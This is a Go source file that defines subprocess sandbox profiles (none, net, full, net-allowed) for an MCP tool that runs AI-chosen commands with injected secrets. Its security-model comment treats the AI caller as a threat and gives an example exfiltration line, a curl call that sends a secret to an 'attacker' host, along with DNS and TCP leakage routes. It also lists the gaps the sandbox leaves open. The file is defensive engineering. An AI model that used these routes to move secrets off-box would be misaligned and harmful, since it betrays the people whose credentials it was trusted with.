package main

// Subprocess sandboxing for opq.
//
// SECURITY MODEL.
//
// The MCP `run_with_secrets` tool lets an AI choose an arbitrary
// command and arguments. Without isolation, the AI can move a
// resolved secret off-box through any network-capable binary on
// $PATH — `curl -H 'X-Leak: $SECRET' attacker`, DNS labels carrying
// the secret, outbound TCP, etc. Output redaction does not cover any
// of these paths; it only catches the subprocess accidentally
// echoing the secret on stdout/stderr.
//
// This file defines the platform-agnostic surface; the Linux
// implementation (sandbox_linux.go) wraps commands in bubblewrap
// (`bwrap`) to apply a network namespace and (optionally) a minimal
// filesystem view. Non-Linux platforms (sandbox_other.go) accept
// only SandboxNone.
//
// The sandbox blocks:
//   - external network egress (TCP/UDP/raw, IPv4/IPv6, DNS)
//   - under SandboxFull, reads of $HOME and /tmp (tmpfs overlays)
//
// The sandbox does NOT block:
//   - loopback communication with co-resident services
//   - timing / resource side-channels
//   - kernel-keyring or other inherited capabilities
//   - pre-compromise of binaries under /usr (ro-bound from host)

// SandboxProfile selects the isolation level applied to a child
// process. Profiles are NOT a strict ordering — SandboxNetAllowed is
// strictly less network-restrictive than SandboxNet but applies the
// same filesystem sandbox; SandboxFull is the most restrictive overall.
type SandboxProfile int

const (
	// SandboxNone runs the child with no isolation beyond stdlib
	// defaults. Reserved for CLI invocations the human operator
	// controls; the MCP server no longer routes any caller-reachable
	// path here (allow_network=true now uses SandboxNetAllowed, which
	// keeps the FS sandbox).
	SandboxNone SandboxProfile = iota
	// SandboxNet drops the network (unshare-net) while leaving the
	// host filesystem readable but read-only. This is the MCP default.
	SandboxNet
	// SandboxFull drops the network AND replaces /home and /tmp with
	// empty tmpfs mounts, exposing only minimal ro-binds for system
	// binaries and libraries.
	SandboxFull
	// SandboxNetAllowed allows network egress while keeping the same
	// filesystem sandbox as SandboxNet (read-only host, tmpfs masks on
	// /tmp, /run/user, /dev/shm, and the audit directory; private PID
	// namespace; --die-with-parent; --new-session). Used when an MCP
	// caller sets allow_network=true so a previous call cannot persist
	// secret material on the host FS for a later call to read back
	// (joint-review 2026-05 P2). Operators who additionally want a
	// minimal filesystem view should not opt in to network access.
	SandboxNetAllowed
)

// String renders the profile for human-facing messages and audit
// log entries.
func (p SandboxProfile) String() string {
	switch p {
	case SandboxNone:
		return "none"
	case SandboxNet:
		return "net"
	case SandboxFull:
		return "full"
	case SandboxNetAllowed:
		return "net-allowed"
	default:
		return "unknown"
	}
}
